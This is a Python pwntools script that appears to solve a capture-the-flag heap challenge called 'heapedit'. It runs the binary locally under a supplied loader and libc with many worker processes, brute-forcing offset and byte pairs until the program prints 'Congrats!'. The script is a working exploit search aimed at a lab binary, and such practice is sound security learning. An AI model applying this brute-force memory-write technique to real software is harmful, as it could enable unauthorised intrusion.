#!/usr/bin/env python3

import multiprocessing as mp
import os
import queue
import shutil
import sys
import tempfile
import time

from pwn import *


def usage(err=None):
    if err is not None:
        log.failure(f"error: {err}")
    log.failure("usage: bf.py <heapedit> <ld.so> <libc6.so> <flag file>")
    sys.exit(0 if err is None else -1)


def setup():
    if len(sys.argv) != 5:
        usage("not enough arguments")
    if any(not os.path.isfile(p) for p in sys.argv[1:]):
        usage("invalid path passed")

    heapedit, ldso, libc, flag_file = sys.argv[1:]

    with tempfile.TemporaryDirectory() as workdir:
        tmp_exe = os.path.join(workdir, 'exe')
        tmp_flag = os.path.join(workdir, 'flag.txt')
        tmp_ldso = os.path.join(workdir, os.path.basename(ldso))
        tmp_libc = os.path.join(workdir, os.path.basename(libc))
        shutil.copy(heapedit, tmp_exe)
        shutil.copy(flag_file, tmp_flag)
        shutil.copy(ldso, tmp_ldso)
        shutil.copy(libc, tmp_libc)
        log.info(f"Set up working directory:")
        log.info(f" - heapedit is {tmp_exe}")
        log.info(f" - ld.so is {tmp_ldso}")
        log.info(f" - libc6.so is {tmp_libc}")
        log.info(f" - flag file is {tmp_flag}")
        for offset, val in brute(tmp_ldso, tmp_exe, workdir):
            log.success(f"Solution: offset={offset}, val={val} ({chr(val)})")


def brute(ldso, exe, wd):
    offsets = mp.Queue(16)
    results = mp.Queue()
    threads = [
        mp.Process(target=brute_thread, args=(ldso, exe, wd, offsets, results))
        for _ in range(len(os.sched_getaffinity(0)))
    ]
    for thread in threads:
        thread.start()
    log.info(f"Created {len(threads)} workers")

    # center of the search
    OFFSET_CENTER = -5143
    next_offset = 0
    try:
        while True:
            # in order:
            # - fill up the input queue
            # - pull results off the output
            # - wait a bit to let things go
            try:
                while True:
                    offsets.put(OFFSET_CENTER + next_offset, False)
                    if next_offset > 0:
                        next_offset = -next_offset
                    else:
                        next_offset = -next_offset + 1
            except queue.Full:
                pass
            try:
                while True:
                    offset, val = results.get(False)
                    yield offset, val
            except queue.Empty:
                pass
            time.sleep(1)
    except KeyboardInterrupt:
        # when the user hits Ctrl+C, close down shop
        # the subprocesses should all get the KeyboardInterrupt too so there's
        # not actually any coordination needed
        offsets.close()
        for thread in threads:
            thread.join()


def brute_thread(ldso, exe, wd, offsets, results):
    try:
        while True:
            offset = offsets.get()
            for val in range(0x21, 0x7f):
                out = subprocess.run(
                    [ldso, exe], cwd=wd, stdout=subprocess.PIPE,
                    input=f'{offset}\n{val}\n'.encode('utf-8'),
                ).stdout
                if out.startswith(b'Congrats!'):
                    results.put((offset, val))
    except KeyboardInterrupt:
        offsets.close()


if __name__ == '__main__':
    setup()
